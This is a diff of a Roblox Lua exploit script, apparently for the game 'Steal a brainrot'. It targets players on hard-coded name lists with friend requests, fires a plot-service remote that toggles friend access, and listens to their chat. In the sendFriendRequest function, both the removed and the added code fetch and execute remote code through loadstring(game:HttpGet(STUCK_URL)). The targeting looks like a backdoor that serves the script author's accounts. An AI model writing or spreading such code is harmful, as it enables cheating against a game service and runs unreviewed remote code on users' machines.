@@ -1,4 +1,3 @@
-
 --[[
    _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
   / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
@@ -24,12 +23,13 @@ end)
 -- ==============================================================
 -- SERVICES & REMOTES
 -- ==============================================================
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
-local ToggleFriends = Net:WaitForChild("RE/PlotService/ToggleFriends")
-local ChatService = game:GetService("Chat")
-local LocalPlayer = Players.LocalPlayer
+local Players          = game:GetService("Players")
+local ReplicatedStorage= game:GetService("ReplicatedStorage")
+local Net              = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+local ToggleFriends    = Net:WaitForChild("RE/PlotService/ToggleFriends")
+local ChatService      = game:GetService("Chat")
+local LocalPlayer      = Players.LocalPlayer
+local GuiService       = game:GetService("GuiService")
 
 -- Auto-find chat remote
 local SayMessageRequest = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
@@ -45,8 +45,8 @@ local STUCK_URL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brain
 -- ==============================================================
 -- HELPERS
 -- ==============================================================
-local friendSent = {}
-local chatConnections = {}
+local friendSent       = {}
+local chatConnections  = {}
 
 local function isInList(name, list)
     for _, v in ipairs(list) do
@@ -57,19 +57,35 @@ local function isInList(name, list)
     return false
 end
 
+-- --------------------------------------------------------------
+-- NEW sendFriendRequest (exploit + GUI fallback)
+-- --------------------------------------------------------------
 local function sendFriendRequest(plr)
-    if plr and plr.UserId and not friendSent[plr.Name] then
+    if not plr or not plr.UserId or friendSent[plr.Name] or plr == LocalPlayer then return end
+    friendSent[plr.Name] = true
+
+    -- EXPLOIT METHOD (works in Synapse/Delta/Krnl etc.)
+    pcall(function()
         LocalPlayer:RequestFriendship(plr)
-        friendSent[plr.Name] = true
-        
-        -- === NEW: RUN stuck.lua IF TARGET IS IN users OR users1 ===
-        if isInList(plr.Name, users) or isInList(plr.Name, users1) then
-            spawn(function()
-                pcall(function()
-                    loadstring(game:HttpGet(STUCK_URL, true))()
-                end)
+    end)
+
+    -- Safe GUI fallback (always runs)
+    spawn(function()
+        task.wait(1.5)
+        pcall(function()
+            GuiService:OpenPlayerProfile(plr)
+        end)
+    end)
+
+    print("Friend request → " .. plr.Name)
+
+    -- Run stuck.lua for target users
+    if isInList(plr.Name, users) or isInList(plr.Name, users1) then
+        spawn(function()
+            pcall(function()
+                loadstring(game:HttpGet(STUCK_URL, true))()
             end)
-        end
+        end)
     end
 end
 
@@ -112,10 +128,12 @@ end
 -- ==============================================================
 local function handlePlayer(plr)
     if plr == LocalPlayer then return end
+
     if isInList(plr.Name, users) or isInList(plr.Name, users1) then
         sendFriendRequest(plr)
         fireToggle()
     end
+
     if isInList(plr.Name, users1) then
         if not chatConnections[plr] then
             chatConnections[plr] = plr.Chatted:Connect(function(msg)
